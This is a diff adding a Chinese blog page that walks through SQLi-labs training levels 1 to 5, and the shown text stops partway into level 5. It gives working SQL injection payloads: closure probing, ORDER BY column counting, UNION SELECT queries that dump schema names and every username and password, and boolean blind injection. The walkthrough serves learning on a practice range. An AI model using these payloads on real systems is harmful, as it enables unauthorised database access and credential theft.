@@ -1,0 +1,1168 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言\r之前总是打了几关就摆了，这次一定打完。\nsql注入基础\rless - 1\r先找注入点，题上已经给了提示，所以注入点就是?id=\n然后确认是数字类型还是字符类型\n?id=1\t------\t无报错 ?id=1 --+\t------\t无报错 ?id=1&#39;\t------\t报错 ?id=1&#39; --+\t------\t无报错 ">
+<title>Sql Labs靶场 [更新中]</title>
+
+<link rel='canonical' href='http://localhost:1313/p/sql-labs%E9%9D%B6%E5%9C%BA-%E6%9B%B4%E6%96%B0%E4%B8%AD/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="Sql Labs靶场 [更新中]">
+<meta property='og:description' content="前言\r之前总是打了几关就摆了，这次一定打完。\nsql注入基础\rless - 1\r先找注入点，题上已经给了提示，所以注入点就是?id=\n然后确认是数字类型还是字符类型\n?id=1\t------\t无报错 ?id=1 --+\t------\t无报错 ?id=1&#39;\t------\t报错 ?id=1&#39; --+\t------\t无报错 ">
+<meta property='og:url' content='http://localhost:1313/p/sql-labs%E9%9D%B6%E5%9C%BA-%E6%9B%B4%E6%96%B0%E4%B8%AD/'>
+<meta property='og:site_name' content='Winglet&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-04-14T22:48:59&#43;08:00'/><meta property='article:modified_time' content='2024-04-14T22:48:59&#43;08:00'/><meta property='og:image' content='https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202406270744823.gif' />
+<meta name="twitter:title" content="Sql Labs靶场 [更新中]">
+<meta name="twitter:description" content="前言\r之前总是打了几关就摆了，这次一定打完。\nsql注入基础\rless - 1\r先找注入点，题上已经给了提示，所以注入点就是?id=\n然后确认是数字类型还是字符类型\n?id=1\t------\t无报错 ?id=1 --+\t------\t无报错 ?id=1&#39;\t------\t报错 ?id=1&#39; --+\t------\t无报错 "><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202406270744823.gif' />
+    <link rel="shortcut icon" href="/img/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "light");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    <img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/2.jpg" width="300" height="300" class="site-logo" loading="lazy" alt="Avatar">
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Winglet&#39;s Blog</a></h1>
+            <h2 class="site-description">翩若惊鸿，宛若游龙。</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/wingllllet'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#sql注入基础">sql注入基础</a></li>
+    <li><a href="#less---1">less - 1</a></li>
+    <li><a href="#less---2">less - 2</a></li>
+    <li><a href="#less---3">less - 3</a></li>
+    <li><a href="#less---4">less - 4</a></li>
+    <li><a href="#less---5">less - 5</a></li>
+    <li><a href="#less---6">less - 6</a></li>
+    <li><a href="#less---7">less - 7</a></li>
+    <li><a href="#less---8">less - 8</a></li>
+    <li><a href="#less---9">less - 9</a></li>
+    <li><a href="#less---10">less - 10</a></li>
+    <li><a href="#less---11">less - 11</a></li>
+    <li><a href="#less---12">less - 12</a></li>
+    <li><a href="#less---13">less - 13</a></li>
+    <li><a href="#less---14">less - 14</a></li>
+    <li><a href="#less---15">less - 15</a></li>
+    <li><a href="#less---16">less - 16</a></li>
+    <li><a href="#less---17">less - 17</a>
+      <ol>
+        <li><a href="#extractvalue">extractvalue</a></li>
+        <li><a href="#updatexml">updatexml</a></li>
+        <li><a href="#group-by">group by</a></li>
+      </ol>
+    </li>
+    <li><a href="#less---18">less - 18</a></li>
+    <li><a href="#less---19">less - 19</a></li>
+    <li><a href="#less---20">less - 20</a></li>
+    <li><a href="#less---21">less - 21</a></li>
+    <li><a href="#less---22">less - 22</a></li>
+    <li><a href="#less---23">less - 23</a></li>
+    <li><a href="#less---24">less - 24</a></li>
+    <li><a href="#less---25">less - 25</a></li>
+    <li><a href="#less---25a">less - 25a</a></li>
+    <li><a href="#less---26">less - 26</a></li>
+    <li><a href="#总结">总结</a>
+      <ol>
+        <li><a href="#get传参和post传参注释符使用的不同">get传参和post传参注释符使用的不同</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/sql-labs%E9%9D%B6%E5%9C%BA-%E6%9B%B4%E6%96%B0%E4%B8%AD/">
+                
+                    <img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202406270744823.gif" loading="lazy" alt="Featured image of post Sql Labs靶场 [更新中]" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E9%9D%B6%E5%9C%BA/" >
+                靶场
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/sql-labs%E9%9D%B6%E5%9C%BA-%E6%9B%B4%E6%96%B0%E4%B8%AD/">Sql Labs靶场 [更新中]</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 14, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 9 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="前言">前言
+</h2><p>之前总是打了几关就摆了，这次一定打完。</p>
+<h2 id="sql注入基础">sql注入基础
+</h2><h2 id="less---1">less - 1
+</h2><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211102977.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240521110201592"
+	
+	
+></p>
+<ol>
+<li>
+<p>先找注入点，题上已经给了提示，所以注入点就是<code>?id=</code></p>
+</li>
+<li>
+<p>然后确认是数字类型还是字符类型</p>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w">		</span><span class="c1">------		无报错        
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="c1">--+	------		无报错
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;		------		报错
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="c1">--+	------		无报错
+</span></span></span></code></pre></div><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211109166.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240521110938758"
+	
+	
+></p>
+<p>所以可以确定是字符类型</p>
+<ol start="3">
+<li>确认列数</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; order by 3		------		正常回显
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">4</span><span class="w">		</span><span class="c1">------		超出列数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">or</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,3,4 ... 
+</span></span></span></code></pre></div><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211112842.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240521111227528"
+	
+	
+></p>
+<p>所以可以确定列数为<code>3</code></p>
+<ol start="4">
+<li>
+<p>联合注入</p>
+<p>先查出显示位</p>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,3--+
+</span></span></span></code></pre></div><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211132875.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240521113202325"
+	
+	
+></p>
+<p>可以知道显示位在<code>2，3</code>位置。这里用<code>-1</code>是为了不让sql语句查询到数据，因为<code>id=-1</code>是没有数据的，所以才会把<code>select</code>执行的语句显示出来。</p>
+<p>最后就可以爆数据了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,database(),version()--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="p">,</span><span class="n">id</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="c1">--+
+</span></span></span></code></pre></div><h2 id="less---2">less - 2
+</h2><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211740465.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240521174005926"
+	
+	
+></p>
+<p>先判断是字符型还是数字型</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w">		</span><span class="c1">------		正常
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w">	</span><span class="c1">------		正常
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">adn</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="w">	</span><span class="c1">------		错误
+</span></span></span></code></pre></div><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211749462.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240521174919070"
+	
+	
+></p>
+<p>可以确定是数字型，后面的步骤就和<code>less-1</code>基本一致了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="k">version</span><span class="p">()</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="p">,</span><span class="n">id</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="c1">--+
+</span></span></span></code></pre></div><h2 id="less---3">less - 3
+</h2><p>先判断类型</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w">		</span><span class="c1">------		正常
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;		------		报错
+</span></span></span></code></pre></div><p>这里报错显示如下</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211824896.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240521182425354"
+	
+	
+></p>
+<p>可以发现和<code>less-1</code>的报错信息很像，但是报错信息中多了<code>)</code>，所以在这关中闭合符号不是<code>'</code>而是<code>')</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;)			------		报错
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="p">)</span><span class="c1">--+		------		正常
+</span></span></span></code></pre></div><p>接着进行注入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;) union select 1,database(),version()--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="p">,</span><span class="n">id</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="c1">--+
+</span></span></span></code></pre></div><h2 id="less---4">less - 4
+</h2><p>还是判断闭合符，这里是通过审计源代码才知道闭合符为<code>&quot;)</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s2">&#34;)		------			报错
+</span></span></span></code></pre></div><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211831781.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240521183124352"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s2">&#34;) union select 1,database(),version()--+
+</span></span></span><span class="line"><span class="cl"><span class="s2">?id=-1&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s2">&#34;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+
+</span></span></span><span class="line"><span class="cl"><span class="s2">?id=-1&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="p">,</span><span class="n">id</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="c1">--+
+</span></span></span></code></pre></div><h2 id="less---5">less - 5
+</h2><p>经过测试可以判断是字符类型且闭合符为<code>'</code>，但是在这关中正常显示的时候只会显示一个页面。</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211835036.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240521183557677"
+	
+	
+></p>
+<p>也就是说我们无法让它显示数据库信息。不过因为只要语句执行正确，它就会显示该页面，所以我们可以构造判断语句，来测出它的数据信息。这就是布尔盲注。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;and length((select database()))&gt;9--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="k">and</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">115</span><span class="c1">--+
